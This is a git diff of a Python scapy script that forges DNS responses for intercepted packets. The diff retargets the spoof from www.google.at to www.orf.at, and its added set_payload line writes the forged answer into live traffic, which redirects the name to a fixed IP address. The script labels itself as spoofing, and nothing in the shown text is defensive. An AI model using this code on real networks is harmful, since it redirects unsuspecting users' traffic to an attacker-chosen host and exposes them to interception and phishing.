@@ -9,7 +9,7 @@ def process_packet(packet):
 	if scapy_packet.haslayer(scapy.DNSRR):
 		q_name = scapy_packet[scapy.DNSQR].qname
 
-		if "www.google.at." in q_name:
+		if "www.orf.at." in q_name:
 			print("[+] Spoofing target: " + q_name)
 
 			answer = scapy.DNSRR(rrname=q_name, rdata="66.254.114.41")
@@ -21,6 +21,7 @@ def process_packet(packet):
 			del scapy_packet[scapy.UDP].len
 			del scapy_packet[scapy.UDP].chksum
 
+			packet.set_payload(str(scapy_packet))
 	packet.accept()
 
 
